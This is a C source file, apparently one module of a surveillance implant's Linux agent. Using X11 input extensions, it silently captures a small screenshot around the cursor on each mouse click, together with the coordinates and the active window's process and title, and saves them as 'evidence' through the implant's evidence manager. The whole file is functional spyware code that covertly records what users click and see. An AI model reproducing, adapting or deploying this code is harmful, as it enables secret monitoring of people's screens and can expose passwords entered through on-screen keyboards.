#define _BSD_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/param.h>
#include <openssl/bio.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/extensions/XInput.h>

#include "module.h"
#include "evidencemanager.h"
#include "me.h"
#include "runtime.h"
#include "imgutils.h"
#include "xutils.h"
#include "bioutils.h"

#define MOUSEMODULE_VERSION 2009040201
struct additional {
   unsigned int version;
   unsigned int processlen;
   unsigned int titlelen;
   unsigned int x;
   unsigned int y;
   unsigned int width;
   unsigned int height;
} __attribute__((packed));

void *module_mouse_main(void *args)
{
   Display *display = NULL;
   int i, devnum = 0, mousenum = 0, buttonrelease = 0;
   XDeviceInfo *devinfo = NULL;
   XDevice **device = NULL;
   XEventClass evlist;
   XEvent event;
   Window root, child;
   int rootX, rootY, childX, childY;
   unsigned int mask;
   XWindowAttributes wininfo;
   int maxfd = -1, xfd = -1;
   int width = 40, height = 40;
   char *process = NULL, *title = NULL;
   int imgx, imgy, imgw, imgh;
   fd_set rfds;
   struct additional a;
   BIO *bio_additional = NULL;
   char *additionalptr, *dataptr = NULL;
   long additionallen, datalen = 0;

   debugme("Module MOUSE started\n");
   if(initlib(INIT_LIBXI|INIT_LIBJPEG)) return NULL;

   if(MODULE_MOUSE_P) {
      width = MODULE_MOUSE_P->width;
      height = MODULE_MOUSE_P->height;
   }

   do {
      if((display = XOpenDisplay(NULL)) == NULL) break;
      if((xfd = ConnectionNumber(display)) < 0) break;
      if(!(devinfo = XListInputDevices(display, &devnum)) || !devnum) break;
      if(!(device = calloc(devnum, sizeof(XDevice *)))) break;
      if(!(bio_additional = BIO_new(BIO_s_mem()))) break;

      for(i = 0; i < devnum; i++) {
         if(devinfo[i].use == IsXExtensionPointer) {
            if(!(device[i] = XOpenDevice(display, devinfo[i].id))) continue;
            DeviceButtonRelease(device[i], buttonrelease, evlist);
            XSelectExtensionEvent(display, DefaultRootWindow(display), &evlist, 1);
            mousenum++;
         }
      }
      if(!mousenum) break;

      maxfd = MAX(xfd, MODULE_MOUSE.event) + 1;

      while(MODULE_MOUSE.status != MODULE_STOPPING) {
         do {
            if(!XPending(display)) {
               FD_ZERO(&rfds);
               FD_SET(xfd, &rfds);
               FD_SET(MODULE_MOUSE.event, &rfds);
               if(select(maxfd, &rfds, NULL, NULL, NULL) == -1) break;
            }
            if(MODULE_MOUSE.status == MODULE_STOPPING) break;
            if(XNextEvent(display, &event)) break;
            if(event.type != buttonrelease) break;
            if(((XDeviceButtonEvent *)&event)->button > 3) break;

            XQueryPointer(display, DefaultRootWindow(display), &root, &child, &rootX, &rootY, &childX, &childY, &mask);
            XGetWindowAttributes(display, DefaultRootWindow(display), &wininfo);
            getwindowproperties(display, getactivewindow(display), &process, &title);
            debugme("MOUSE b=%d, x=%d, y=%d (%s | %.20s)\n", ((XDeviceButtonEvent *)&event)->button, rootX, rootY, process, title);

            imgx = MAX(rootX - (width / 2), 0);
            imgy = MAX(rootY - (height / 2), 0);
            imgw = MIN(rootX + (width / 2), wininfo.width) - imgx;
            imgh = MIN(rootY + (height / 2), wininfo.height) - imgy;
            if(!(datalen = getscreenimage(display, DefaultRootWindow(display), imgx, imgy, imgw, imgh, 90, &dataptr))) break;

            a.version = MOUSEMODULE_VERSION;
            a.processlen = strlen16(process) + 2;
            a.titlelen = strlen16(title) + 2;
            a.x = rootX;
            a.y = rootY;
            a.width = imgw;
            a.height = imgh;
            (void)BIO_reset(bio_additional);
            BIO_write(bio_additional, &a, sizeof(a));
            BIO_puts16n(bio_additional, process);
            BIO_puts16n(bio_additional, title);
            if(!(additionallen = BIO_get_mem_data(bio_additional, &additionalptr))) break;

            evidence_write(EVIDENCE_TYPE_MOUSE, additionalptr, additionallen, dataptr, datalen);
         } while(0);
         if(dataptr) { free(dataptr); dataptr = NULL; }
         if(process) { free(process); process = NULL; }
         if(title) { free(title); title = NULL; }
      }
   } while(0);
   if(bio_additional) BIO_free(bio_additional);
   if(device) {
      for(i = 0; i < devnum; i++) if(device[i]) XCloseDevice(display, device[i]);
      free(device);
   }
   if(devinfo) XFreeDeviceList(devinfo);
   if(display) XCloseDisplay(display);

   debugme("Module MOUSE stopped\n");

   return NULL;
}
